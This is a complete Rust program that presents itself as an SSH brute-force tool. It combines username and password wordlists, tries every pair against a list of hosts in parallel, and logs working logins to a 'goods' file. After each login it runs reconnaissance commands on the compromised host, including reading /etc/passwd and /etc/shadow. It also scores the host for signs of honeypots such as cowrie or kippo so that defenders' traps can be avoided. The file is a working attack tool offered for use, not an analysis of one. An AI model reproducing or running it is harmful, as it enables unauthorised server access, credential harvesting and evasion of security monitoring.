use chrono::Local;
use crossbeam_channel::{bounded, Receiver, Sender};
use regex::Regex;
use ssh2::Session;
use std::collections::{HashMap, HashSet};
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicI64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

const VERSION: &str = "2.6";
const CONCURRENT_PER_WORKER: usize = 1;

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

struct Stats {
    goods: AtomicI64,
    errors: AtomicI64,
    honeypots: AtomicI64,
}

impl Stats {
    fn new() -> Self {
        Self {
            goods: AtomicI64::new(0),
            errors: AtomicI64::new(0),
            honeypots: AtomicI64::new(0),
        }
    }
}

#[derive(Clone)]
struct SshTask {
    ip: String,
    port: String,
    username: String,
    password: String,
}

struct ServerInfo {
    ip: String,
    port: String,
    username: String,
    password: String,
    is_honeypot: bool,
    honeypot_score: i32,
    ssh_version: String,
    os_info: String,
    hostname: String,
    response_time: Duration,
    commands: HashMap<String, String>,
    open_ports: Vec<String>,
}

struct HoneypotDetector {
    time_analysis: bool,
    #[allow(dead_code)]
    command_analysis: bool,
    network_analysis: bool,
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

fn main() {
    let stdin = io::stdin();
    let mut reader = stdin.lock();

    create_combo_file(&mut reader);

    print!("Enter the IP list file path: ");
    io::stdout().flush().ok();
    let mut ip_file = String::new();
    reader.read_line(&mut ip_file).ok();
    let ip_file = ip_file.trim().to_string();

    print!("Enter the timeout value (seconds): ");
    io::stdout().flush().ok();
    let mut timeout_str = String::new();
    reader.read_line(&mut timeout_str).ok();
    let timeout: u64 = timeout_str.trim().parse().unwrap_or(10);

    print!("Enter the maximum number of workers: ");
    io::stdout().flush().ok();
    let mut workers_str = String::new();
    reader.read_line(&mut workers_str).ok();
    let max_workers: usize = workers_str.trim().parse().unwrap_or(10);

    let start_time = Instant::now();

    let combos = get_items("combo.txt");
    let ips = get_items(&ip_file);
    let total_ip_count = ips.len().saturating_mul(combos.len());

    let stats = Arc::new(Stats::new());
    let successful_ips: Arc<Mutex<HashSet<String>>> = Arc::new(Mutex::new(HashSet::new()));

    setup_enhanced_worker_pool(
        combos,
        ips,
        max_workers,
        timeout,
        stats,
        successful_ips,
        ip_file,
        total_ip_count,
        start_time,
    );

    println!("Operation completed successfully!");
}

// ---------------------------------------------------------------------------
// File helpers
// ---------------------------------------------------------------------------

fn get_items(path: &str) -> Vec<Vec<String>> {
    let file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to open file: {}", e);
            std::process::exit(1);
        }
    };
    let reader = BufReader::new(file);
    let mut items = Vec::new();
    for line in reader.lines().flatten() {
        if !line.is_empty() {
            items.push(line.split(':').map(|s| s.to_string()).collect());
        }
    }
    items
}

fn create_combo_file<R: BufRead>(reader: &mut R) {
    print!("Enter the username list file path: ");
    io::stdout().flush().ok();
    let mut username_file = String::new();
    reader.read_line(&mut username_file).ok();
    let username_file = username_file.trim().to_string();

    print!("Enter the password list file path: ");
    io::stdout().flush().ok();
    let mut password_file = String::new();
    reader.read_line(&mut password_file).ok();
    let password_file = password_file.trim().to_string();

    let usernames = get_items(&username_file);
    let passwords = get_items(&password_file);

    let mut file = match File::create("combo.txt") {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to create combo file: {}", e);
            std::process::exit(1);
        }
    };

    for username in &usernames {
        for password in &passwords {
            if !username.is_empty() && !password.is_empty() {
                let _ = writeln!(file, "{}:{}", username[0], password[0]);
            }
        }
    }
}

fn append_to_file(data: &str, path: &str) {
    match OpenOptions::new().append(true).create(true).open(path) {
        Ok(mut f) => {
            if let Err(e) = f.write_all(data.as_bytes()) {
                eprintln!("Failed to write to file: {}", e);
            }
        }
        Err(e) => eprintln!("Failed to open file for append: {}", e),
    }
}

fn clear_screen() {
    #[cfg(target_os = "windows")]
    {
        let _ = Command::new("cmd").args(["/c", "cls"]).status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = Command::new("clear").status();
    }
}

// ---------------------------------------------------------------------------
// SSH plumbing
// ---------------------------------------------------------------------------

fn ssh_connect(
    ip: &str,
    port: &str,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Option<Session> {
    let addr = format!("{}:{}", ip, port);
    let sockaddr = addr.to_socket_addrs().ok()?.next()?;
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let tcp = TcpStream::connect_timeout(&sockaddr, timeout).ok()?;
    tcp.set_read_timeout(Some(timeout)).ok()?;
    tcp.set_write_timeout(Some(timeout)).ok()?;

    let mut sess = Session::new().ok()?;
    sess.set_tcp_stream(tcp);
    sess.set_timeout(timeout_secs as u32 * 1000);
    sess.handshake().ok()?;
    sess.userauth_password(username, password).ok()?;

    if sess.authenticated() {
        Some(sess)
    } else {
        None
    }
}

fn execute_command(sess: &Session, command: &str) -> String {
    let mut channel = match sess.channel_session() {
        Ok(c) => c,
        Err(e) => return format!("ERROR: {}", e),
    };
    if let Err(e) = channel.exec(command) {
        return format!("ERROR: {}", e);
    }

    let mut stdout = String::new();
    let _ = channel.read_to_string(&mut stdout);

    let mut stderr = String::new();
    {
        let mut stderr_stream = channel.stderr();
        let _ = stderr_stream.read_to_string(&mut stderr);
    }

    if stderr.is_empty() {
        stdout
    } else {
        format!("{}{}", stdout, stderr)
    }
}

// ---------------------------------------------------------------------------
// System information gathering
// ---------------------------------------------------------------------------

fn gather_system_info(sess: &Session, server_info: &mut ServerInfo) {
    let commands: [(&str, &str); 12] = [
        ("hostname", "hostname"),
        ("uname", "uname -a"),
        ("whoami", "whoami"),
        ("pwd", "pwd"),
        ("ls_root", "ls -la /"),
        ("ps", "ps aux | head -10"),
        ("netstat", "netstat -tulpn | head -10"),
        ("history", "history | tail -5"),
        ("ssh_version", "ssh -V"),
        ("uptime", "uptime"),
        ("mount", "mount | head -5"),
        ("env", "env | head -10"),
    ];

    for (name, cmd) in commands.iter() {
        let output = execute_command(sess, cmd);
        server_info.commands.insert(name.to_string(), output.clone());

        match *name {
            "hostname" => server_info.hostname = output.trim().to_string(),
            "uname" => server_info.os_info = output.trim().to_string(),
            "ssh_version" => server_info.ssh_version = output.trim().to_string(),
            _ => {}
        }
    }

    server_info.open_ports = scan_local_ports(sess);
}

fn scan_local_ports(sess: &Session) -> Vec<String> {
    let output = execute_command(
        sess,
        "netstat -tulpn 2>/dev/null | grep LISTEN | head -20",
    );
    let mut ports: Vec<String> = Vec::new();
    let re = Regex::new(r":(\d+)\s").unwrap();

    for line in output.lines() {
        for cap in re.captures_iter(line) {
            if let Some(p) = cap.get(1) {
                let s = p.as_str().to_string();
                if !ports.contains(&s) {
                    ports.push(s);
                }
            }
        }
    }
    ports
}

// ---------------------------------------------------------------------------
// Honeypot detection
// ---------------------------------------------------------------------------

fn detect_honeypot(
    sess: &Session,
    server_info: &mut ServerInfo,
    detector: &HoneypotDetector,
) -> bool {
    let mut score = 0;

    score += analyze_command_output(server_info);
    if detector.time_analysis {
        score += analyze_response_time(server_info);
    }
    score += analyze_file_system(server_info);
    score += analyze_processes(server_info);
    if detector.network_analysis {
        score += analyze_network(sess);
    }
    score += behavioral_tests(sess, server_info);
    score += detect_anomalies(server_info);
    score += advanced_honeypot_tests(sess);
    score += performance_tests(sess);

    server_info.honeypot_score = score;
    score >= 6
}

fn analyze_command_output(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let indicators = [
        "fake", "simulation", "honeypot", "trap", "monitor",
        "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
        "/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
    ];
    for output in server_info.commands.values() {
        let lower = output.to_lowercase();
        for ind in indicators.iter() {
            if lower.contains(ind) {
                score += 3;
            }
        }
    }
    score
}

fn analyze_response_time(server_info: &ServerInfo) -> i32 {
    if server_info.response_time.as_millis() < 10 { 2 } else { 0 }
}

fn analyze_file_system(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let ls_output = match server_info.commands.get("ls_root") {
        Some(o) => o,
        None => return 0,
    };
    let suspicious = ["total 0", "total 4", "honeypot", "fake", "simulation"];
    let lower = ls_output.to_lowercase();
    for p in suspicious.iter() {
        if lower.contains(p) {
            score += 1;
        }
    }
    if ls_output.trim().lines().count() < 5 {
        score += 1;
    }
    score
}

fn analyze_processes(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let ps_output = match server_info.commands.get("ps") {
        Some(o) => o,
        None => return 0,
    };
    let suspicious = [
        "cowrie", "kippo", "honeypot", "honeyd",
        "artillery", "honeytrap", "glastopf",
        "python honeypot", "perl honeypot",
    ];
    let lower = ps_output.to_lowercase();
    for p in suspicious.iter() {
        if lower.contains(p) {
            score += 2;
        }
    }
    if ps_output.trim().lines().count() < 5 {
        score += 1;
    }
    score
}

fn analyze_network(sess: &Session) -> i32 {
    let mut score = 0;

    let cfg = execute_command(
        sess,
        "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5",
    );
    let cl = cfg.to_lowercase();
    if cl.contains("total 0") || cl.contains("no such file") || cfg.trim().len() < 10 {
        score += 1;
    }

    let iface = execute_command(sess, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5");
    let il = iface.to_lowercase();
    if il.contains("fake")
        || il.contains("honeypot")
        || il.contains("trap")
        || iface.trim().len() < 10
    {
        score += 1;
    }

    let route = execute_command(sess, "ip route show 2>/dev/null | head -3");
    if route.trim().len() < 20 {
        score += 1;
    }
    score
}

fn behavioral_tests(sess: &Session, _server_info: &mut ServerInfo) -> i32 {
    let mut score = 0;

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let tmp = format!("/tmp/test_{}", ts);
    let out = execute_command(sess, &format!("echo 'test' > {}", tmp));
    let lower = out.to_lowercase();
    if lower.contains("error") || lower.contains("permission denied") {
        score += 1;
    } else {
        execute_command(sess, &format!("rm -f {}", tmp));
    }

    let sensitive = ["/etc/passwd", "/etc/shadow", "/proc/version"];
    let mut accessible = 0;
    for f in sensitive.iter() {
        let o = execute_command(sess, &format!("cat {} 2>/dev/null | head -1", f));
        if !o.to_lowercase().contains("error") && !o.is_empty() {
            accessible += 1;
        }
    }
    if accessible == sensitive.len() {
        score += 1;
    }

    let cmds = ["id", "whoami", "pwd"];
    let mut working = 0;
    for c in cmds.iter() {
        let o = execute_command(sess, c);
        if !o.to_lowercase().contains("error") && !o.is_empty() {
            working += 1;
        }
    }
    if working == 0 {
        score += 2;
    }
    score
}

fn advanced_honeypot_tests(sess: &Session) -> i32 {
    let mut score = 0;

    let cpu = execute_command(sess, "cat /proc/cpuinfo | grep 'model name' | head -1");
    let cl = cpu.to_lowercase();
    if cl.contains("qemu") || cl.contains("virtual") {
        score += 1;
    }

    let kernel = execute_command(sess, "uname -r");
    if kernel.contains("generic") && kernel.trim().len() < 20 {
        score += 1;
    }

    let pms = ["which apt", "which yum", "which pacman", "which zypper"];
    let mut working_pms = 0;
    for pm in pms.iter() {
        let o = execute_command(sess, pm);
        if !o.contains("not found") && !o.trim().is_empty() {
            working_pms += 1;
        }
    }
    if working_pms == 0 {
        score += 1;
    }

    let services = execute_command(
        sess,
        "systemctl list-units --type=service --state=running 2>/dev/null | head -10",
    );
    if services.contains("0 loaded units") || services.trim().len() < 50 {
        score += 1;
    }

    let net = execute_command(sess, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'");
    if net.trim().is_empty() {
        score += 1;
    }

    score
}

fn performance_tests(sess: &Session) -> i32 {
    let mut score = 0;
    let io = execute_command(sess, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1");
    if io.contains("command not found") {
        score += 1;
    }
    execute_command(sess, "rm -f /tmp/test");

    let net = execute_command(sess, "ss -tuln 2>/dev/null | wc -l");
    if !net.is_empty() {
        if let Ok(count) = net.trim().parse::<i32>() {
            if count < 5 {
                score += 1;
            }
        }
    }
    score
}

fn detect_anomalies(server_info: &ServerInfo) -> i32 {
    let mut score = 0;

    if !server_info.hostname.is_empty() {
        let suspicious = [
            "honeypot", "fake", "trap", "monitor", "sandbox",
            "test", "simulation", "gnu/linux", "preempt_dynamic",
        ];
        let h = server_info.hostname.to_lowercase();
        for s in suspicious.iter() {
            if h.contains(s) {
                score += 1;
            }
        }
    }

    if let Some(u) = server_info.commands.get("uptime") {
        if u.contains("0:") || u.contains("min") || u.contains("command not found") {
            score += 1;
        }
    }

    if let Some(h) = server_info.commands.get("history") {
        if h.trim().lines().count() < 3 {
            score += 1;
        }
    }
    score
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------

fn log_successful_connection(info: &ServerInfo) {
    let msg = format!("{}:{}@{}:{}", info.ip, info.port, info.username, info.password);
    append_to_file(&format!("{}\n", msg), "su-goods.txt");

    let detailed = format!(
        "\n=== SSH Success ===\n🌐 Target: {}:{}\n🔑 Credentials: {}:{}\n🖥️ Hostname: {}\n🐧 OS: {}\n📡 SSH Version: {}\n⚡ Response Time: {:?}\n🍯 Honeypot Score: {}\n🕒 Timestamp: {}\n========================\n",
        info.ip, info.port,
        info.username, info.password,
        info.hostname,
        info.os_info,
        info.ssh_version,
        info.response_time,
        info.honeypot_score,
        Local::now().format("%Y-%m-%d %H:%M:%S"),
    );
    append_to_file(&detailed, "detailed-results.txt");

    println!("✅ SUCCESS: {}", msg);
}

// ---------------------------------------------------------------------------
// Banner
// ---------------------------------------------------------------------------

fn format_time(seconds: f64) -> String {
    let t = seconds as u64;
    let days = t / 86400;
    let hours = (t % 86400) / 3600;
    let minutes = (t % 3600) / 60;
    let secs = t % 60;
    format!("{:02}:{:02}:{:02}:{:02}", days, hours, minutes, secs)
}

fn banner(
    stats: Arc<Stats>,
    ip_file: String,
    timeout: u64,
    max_workers: usize,
    total_ip_count: usize,
    start_time: Instant,
    stop_flag: Arc<AtomicBool>,
) {
    loop {
        thread::sleep(Duration::from_millis(500));

        let goods = stats.goods.load(Ordering::Relaxed);
        let errors = stats.errors.load(Ordering::Relaxed);
        let honeypots = stats.honeypots.load(Ordering::Relaxed);

        let total_connections = (goods + errors + honeypots) as usize;
        let elapsed = start_time.elapsed().as_secs_f64();
        let cps = if elapsed > 0.0 {
            total_connections as f64 / elapsed
        } else {
            0.0
        };
        let remaining = if cps > 0.0 {
            (total_ip_count as f64 - total_connections as f64) / cps
        } else {
            0.0
        };

        clear_screen();

        println!("==========================================");
        println!("🚀 Advanced SSH Brute Force Tool v{} 🚀", VERSION);
        println!("==========================================");
        println!("📁 File: {} | ⏱️  Timeout: {}s", ip_file, timeout);
        println!(
            "🔗 Max Workers: {} | Per Worker: {}",
            max_workers, CONCURRENT_PER_WORKER
        );
        println!("==========================================");
        println!("🔍 Checked SSH: {}/{}", total_connections, total_ip_count);
        println!("⚡ Speed: {:.2} checks/sec", cps);

        if total_connections < total_ip_count {
            println!("⏳ Elapsed: {}", format_time(elapsed));
            println!("⏰ Remaining: {}", format_time(remaining));
            println!("==========================================");
        } else {
            println!("⏳ Total Time: {}", format_time(elapsed));
            println!("✅ Scan Completed Successfully!");
        }

        println!("✅ Successful: {}", goods);
        println!("❌ Failed: {}", errors);
        println!("🍯 Honeypots: {}", honeypots);
        println!("==========================================");

        if total_connections > 0 {
            let succ = goods + honeypots;
            if succ > 0 {
                println!(
                    "📊 Success Rate: {:.2}%",
                    goods as f64 / succ as f64 * 100.0
                );
                println!(
                    "🍯 Honeypot Rate: {:.2}%",
                    honeypots as f64 / succ as f64 * 100.0
                );
            }
        }

        if stop_flag.load(Ordering::Relaxed) || total_connections >= total_ip_count {
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Worker pool
// ---------------------------------------------------------------------------

fn calculate_optimal_buffers(max_workers: usize) -> usize {
    ((max_workers * CONCURRENT_PER_WORKER) as f64 * 1.5) as usize
}

#[allow(clippy::too_many_arguments)]
fn setup_enhanced_worker_pool(
    combos: Vec<Vec<String>>,
    ips: Vec<Vec<String>>,
    max_workers: usize,
    timeout: u64,
    stats: Arc<Stats>,
    successful_ips: Arc<Mutex<HashSet<String>>>,
    ip_file: String,
    total_ip_count: usize,
    start_time: Instant,
) {
    let buffer = calculate_optimal_buffers(max_workers);
    let (tx, rx): (Sender<SshTask>, Receiver<SshTask>) = bounded(buffer);

    let stop_flag = Arc::new(AtomicBool::new(false));

    // Banner thread
    let banner_stats = stats.clone();
    let banner_stop = stop_flag.clone();
    let banner_handle = thread::spawn(move || {
        banner(
            banner_stats,
            ip_file,
            timeout,
            max_workers,
            total_ip_count,
            start_time,
            banner_stop,
        );
    });

    // Workers
    let mut worker_handles = Vec::new();
    for _ in 0..max_workers {
        let rx = rx.clone();
        let stats = stats.clone();
        let successful_ips = successful_ips.clone();
        worker_handles.push(thread::spawn(move || {
            while let Ok(task) = rx.recv() {
                process_ssh_task(task, &stats, &successful_ips, timeout);
            }
        }));
    }
    drop(rx);

    // Producer
    let producer = thread::spawn(move || {
        for combo in combos.iter() {
            for ip in ips.iter() {
                if ip.len() < 2 || combo.len() < 2 {
                    continue;
                }
                let task = SshTask {
                    ip: ip[0].clone(),
                    port: ip[1].clone(),
                    username: combo[0].clone(),
                    password: combo[1].clone(),
                };
                if tx.send(task).is_err() {
                    return;
                }
            }
        }
    });

    for h in worker_handles {
        let _ = h.join();
    }
    let _ = producer.join();

    stop_flag.store(true, Ordering::Relaxed);
    let _ = banner_handle.join();
}

fn process_ssh_task(
    task: SshTask,
    stats: &Arc<Stats>,
    successful_ips: &Arc<Mutex<HashSet<String>>>,
    timeout: u64,
) {
    let connection_start = Instant::now();

    if let Some(sess) =
        ssh_connect(&task.ip, &task.port, &task.username, &task.password, timeout)
    {
        let mut info = ServerInfo {
            ip: task.ip.clone(),
            port: task.port.clone(),
            username: task.username.clone(),
            password: task.password.clone(),
            is_honeypot: false,
            honeypot_score: 0,
            ssh_version: String::new(),
            os_info: String::new(),
            hostname: String::new(),
            response_time: connection_start.elapsed(),
            commands: HashMap::new(),
            open_ports: Vec::new(),
        };

        let detector = HoneypotDetector {
            time_analysis: true,
            command_analysis: true,
            network_analysis: true,
        };

        gather_system_info(&sess, &mut info);
        info.is_honeypot = detect_honeypot(&sess, &mut info, &detector);

        let key = format!("{}:{}", info.ip, info.port);
        let already_seen = {
            let mut ips = successful_ips.lock().unwrap();
            if ips.contains(&key) {
                true
            } else {
                ips.insert(key);
                false
            }
        };

        if !already_seen {
            if !info.is_honeypot {
                stats.goods.fetch_add(1, Ordering::Relaxed);
                log_successful_connection(&info);
            } else {
                stats.honeypots.fetch_add(1, Ordering::Relaxed);
                eprintln!(
                    "🍯 Honeypot detected: {}:{} (Score: {})",
                    info.ip, info.port, info.honeypot_score
                );
                append_to_file(
                    &format!(
                        "HONEYPOT: {}:{}@{}:{} (Score: {})\n",
                        info.ip, info.port, info.username, info.password, info.honeypot_score
                    ),
                    "honeypots.txt",
                );
            }
        }
    } else {
        stats.errors.fetch_add(1, Ordering::Relaxed);
    }
}
